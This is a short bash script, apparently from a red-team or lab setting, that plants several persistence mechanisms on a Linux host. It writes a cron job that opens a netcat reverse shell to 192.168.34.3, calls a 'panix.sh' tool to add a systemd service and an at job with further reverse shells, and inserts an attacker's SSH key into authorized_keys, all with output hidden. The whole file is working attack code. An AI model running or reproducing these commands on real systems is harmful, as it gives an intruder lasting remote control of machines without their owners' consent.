#!/bin/bash
 
 
#Reverse shell cron job
KEEP_ME_SCRIPT="$HOME/Documents/keep-me.sh"
 
if [ -f "$KEEP_ME_SCRIPT" ]; then
    bash "$KEEP_ME_SCRIPT"
 
else
echo '#!/bin/bash
CRON_JOB="* * * * * mkfifo /tmp/p; nc 192.168.34.3 4444 0</tmp/p | /bin/bash > /tmp/p 2>&1; rm /tmp/p"
(crontab -l 2>/dev/null | grep -q "$CRON_JOB") || {
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
}' | > "$KEEP_ME_SCRIPT"
 
chmod +x "$KEEP_ME_SCRIPT"
 
fi
 
# Service creation
bash /panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null
 
# at job creation
bash /panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24 hours" >/dev/null
 
# authorized_keys persistence
bash /panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
echo "test"
